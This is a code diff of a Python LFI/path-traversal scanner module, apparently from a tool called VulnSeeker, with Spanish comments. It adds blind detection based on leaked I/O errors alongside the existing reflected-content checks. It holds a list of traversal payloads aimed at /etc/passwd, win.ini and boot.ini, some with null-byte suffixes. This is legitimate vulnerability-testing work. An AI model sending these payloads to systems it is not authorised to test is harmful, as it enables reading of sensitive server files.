@@ -1,96 +1,118 @@
 import logging
 import re
-import urllib.parse
 from typing import List
 
-import requests
-
 from core.models import ScannerModule, Target, Vulnerability, Severity
+from modules.injection_points import collect_points
 
 logger = logging.getLogger("VulnSeeker")
-UA_BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 
 
 class LFIScanner(ScannerModule):
+    """Detecta inclusión/lectura de archivos locales (LFI / path traversal).
+
+    Ataca todos los vectores del objetivo (GET query, POST/GET form y JSON, vía
+    :func:`collect_points`) con dos técnicas complementarias:
+
+    - **Contenido reflejado:** si la respuesta trae el contenido del archivo
+      objetivo (``root:x:0:0`` de ``/etc/passwd``, secciones de ``win.ini``), la
+      inclusión es directa. Es la LFI "clásica".
+    - **Error-based (ciega):** cuando la aplicación intenta abrir la ruta y falla,
+      a veces filtra la excepción de E/S en la respuesta (``FileNotFoundException``,
+      ``failed to open stream``…). Es el análogo del SQLi basado en errores y
+      permite detectar path traversal aunque el contenido del archivo no se refleje.
+
+    Ambas técnicas usan una guarda de baseline: sólo se reporta si la señal aparece
+    con el payload y NO con un valor benigno, para descartar falsos positivos
+    preexistentes en la página.
+    """
+
+    PAYLOADS = [
+        "../../../../etc/passwd",
+        "/etc/passwd",
+        "../../../../../../../../etc/passwd",
+        "../../../../windows/win.ini",
+        "../../../../boot.ini",
+        "../../etc/passwd%00",
+        "/etc/passwd%00",
+        "../../../../windows/win.ini%00",
+        "../../../../boot.ini%00",
+    ]
+    FALLBACK_PARAMS = ["page", "file", "doc", "view", "include", "content"]
+
+    # Valor benigno neutro para la petición baseline.
+    BENIGN = "index"
+
+    # Firmas de CONTENIDO: el archivo objetivo se refleja en la respuesta.
+    CONTENT_SIGNATURES = [
+        r"root:x:0:0:",              # /etc/passwd
+        r"\[(extensions|fonts)\]",   # win.ini
+    ]
+
+    # Firmas de ERROR: la app intentó abrir la ruta y filtró la excepción de E/S.
+    # Se eligen firmas específicas de "archivo/ruta no resuelta" (baja tasa de FP);
+    # se evitan errores de E/S genéricos que podrían dispararse por otras causas.
+    ERROR_SIGNATURES = [
+        "java.io.FileNotFoundException",          # Java: new File / FileInputStream
+        "java.nio.file.NoSuchFileException",
+        "java.nio.file.AccessDeniedException",
+        "System.IO.FileNotFoundException",        # .NET
+        "System.IO.DirectoryNotFoundException",
+        "failed to open stream",                  # PHP: include/fopen
+        "Failed opening required",
+    ]
+
     @property
     def name(self) -> str:
         return "Local File Inclusion (LFI)"
 
     @property
     def description(self) -> str:
-        return "Detecta inclusión de archivos locales (etc/passwd, win.ini, boot.ini)."
+        return ("Detecta inclusión/lectura de archivos locales por contenido "
+                "reflejado y por fugas de errores de E/S (path traversal ciego).")
 
     def run(self, target: Target) -> List[Vulnerability]:
         vulns: List[Vulnerability] = []
-        payloads = [
-            "../../../../etc/passwd",
-            "/etc/passwd",
-            "../../../../../../../../etc/passwd",
-            "../../../../windows/win.ini",
-            "../../../../boot.ini",
-            "../../etc/passwd%00",
-            "/etc/passwd%00",
-            "../../../../windows/win.ini%00",
-            "../../../../boot.ini%00",
-        ]
-        common_params = ["page", "file", "doc", "view", "include", "content"]
+        headers = dict(target.headers) if target.headers else None
+        points = collect_points(target, fallback_params=self.FALLBACK_PARAMS)
 
-        parsed = urllib.parse.urlparse(target.url)
-        params = dict(urllib.parse.parse_qsl(parsed.query))
-        targets_to_test = []
-
-        req_headers = {"User-Agent": UA_BROWSER}
-        if target.headers:
-            req_headers.update(target.headers)
-
-        # Obtener baseline para descartar falsos positivos pre-existentes
-        baseline_text = ""
-        try:
-            resp_base = requests.get(target.url, timeout=6, headers=req_headers, verify=False, allow_redirects=True)
-            baseline_text = resp_base.text or ""
-        except Exception:
-            pass
-
-        if params:
-            for key in params:
-                for payload in payloads:
-                    new_params = params.copy()
-                    new_params[key] = payload
-                    new_query = urllib.parse.urlencode(new_params, doseq=True)
-                    new_url = parsed._replace(query=new_query).geturl()
-                    targets_to_test.append((new_url, key, payload))
-        else:
-            base = target.url.rstrip("/")
-            for p in common_params:
-                for payload in payloads:
-                    new_url = f"{base}/?{p}={urllib.parse.quote(payload, safe='/%')}"
-                    targets_to_test.append((new_url, p, payload))
-
-        for test_url, param_name, payload in targets_to_test:
-            try:
-                logger.info(f"📂 LFI Scanner: probando {test_url}")
-                resp = requests.get(test_url, timeout=6, headers=req_headers, verify=False, allow_redirects=True)
-                body = resp.text or ""
-                
-                # Comprobar indicadores ignorando coincidencias pre-existentes en el baseline
-                has_lfi = False
-                if re.search(r"root:x:0:0:", body, re.IGNORECASE) and not re.search(r"root:x:0:0:", baseline_text, re.IGNORECASE):
-                    has_lfi = True
-                elif re.search(r"\[(extensions|fonts)\]", body, re.IGNORECASE) and not re.search(r"\[(extensions|fonts)\]", baseline_text, re.IGNORECASE):
-                    has_lfi = True
-                    
-                if has_lfi:
-                    evidence = body[:50].replace("\n", " ").replace("\r", " ")
-                    vulns.append(Vulnerability(
-                        name="Local File Inclusion (LFI)",
-                        description=f"Parámetro vulnerable: {param_name}",
-                        severity=Severity.CRITICAL,
-                        target_url=test_url,
-                        payload=payload + f" | evidencia: {evidence}"
-                    ))
-                    break
-            except Exception as e:
-                logger.debug(f"LFI Scanner error en {test_url}: {e}")
-                continue
+        for pt in points:
+            self._probe(pt, headers, vulns)  # un hallazgo por punto como máximo
 
         return vulns
+
+    def _probe(self, pt, headers, vulns) -> bool:
+        base = pt.send(self.BENIGN, headers=headers)
+        baseline = (base.text if base is not None else "") or ""
+
+        for payload in self.PAYLOADS:
+            resp = pt.send(payload, headers=headers)
+            if resp is None:
+                continue
+            body = resp.text or ""
+
+            # (1) Contenido del archivo reflejado (LFI directa).
+            for pat in self.CONTENT_SIGNATURES:
+                if re.search(pat, body, re.IGNORECASE) and not re.search(pat, baseline, re.IGNORECASE):
+                    self._report(pt, payload, "contenido reflejado", body, vulns)
+                    return True
+
+            # (2) Excepción de E/S filtrada (path traversal ciego).
+            low_body, low_base = body.lower(), baseline.lower()
+            for sig in self.ERROR_SIGNATURES:
+                if sig.lower() in low_body and sig.lower() not in low_base:
+                    self._report(pt, payload, f"error de E/S ({sig})", body, vulns)
+                    return True
+
+        return False
+
+    def _report(self, pt, payload, via, body, vulns) -> None:
+        evidence = body[:80].replace("\n", " ").replace("\r", " ")
+        vulns.append(Vulnerability(
+            name="Local File Inclusion (LFI)",
+            description=f"Parámetro vulnerable: {pt.param_name} (detección por {via}).",
+            severity=Severity.CRITICAL,
+            target_url=pt.report_url,
+            payload=f"{payload} | evidencia: {evidence}",
+        ))
+        logger.info(f"📂 LFI en '{pt.param_name}' vía {via}")
